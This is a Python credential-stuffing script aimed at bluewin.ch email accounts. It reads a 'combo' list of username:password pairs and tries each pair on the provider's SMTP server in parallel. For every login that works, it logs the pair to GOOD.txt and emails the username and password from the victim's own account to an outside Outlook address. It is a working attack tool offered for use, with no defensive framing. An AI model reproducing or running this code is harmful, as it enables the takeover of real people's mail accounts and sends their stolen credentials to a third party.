import smtplib
import datetime
from multiprocessing import Pool

def work(user,pwd):
    print("LIVE => "+user+":"+pwd+"")
    f = open("GOOD.txt", "a+")
    f.write("LIVE => "+user+":"+pwd+"\n")

def bad(user,pwd):
    print("BAD => "+user+":"+pwd+"")



def checker(data):
    try:
     data = data.split(":")
     user = data[0]+"@bluewin.ch"
     pwd = data[1]
     mailserver = smtplib.SMTP('smtpauths.bluewin.ch', 587)
     mailserver.ehlo()
     mailserver.starttls()
     mailserver.login(user, pwd)
     subj = "go go"
     date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
     from_addr = user
     to_addr = "optimatest1@outlook.com"
     message_text = "" , user , "|" , pwd , ""
     msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s" % (from_addr, to_addr, subj, date, message_text)
     mailserver.sendmail(from_addr, to_addr, msg)
     mailserver.quit()
     work(user,pwd)
    except:
        bad(user,pwd)



if __name__ =="__main__":
  file_name = input("Enter Your combo Name :")
  try:
    TEXTList = open(file_name, 'r').read().splitlines()
    p = Pool(5)
    p.map(checker, TEXTList)
  except:
    print("failed to make process")
    pass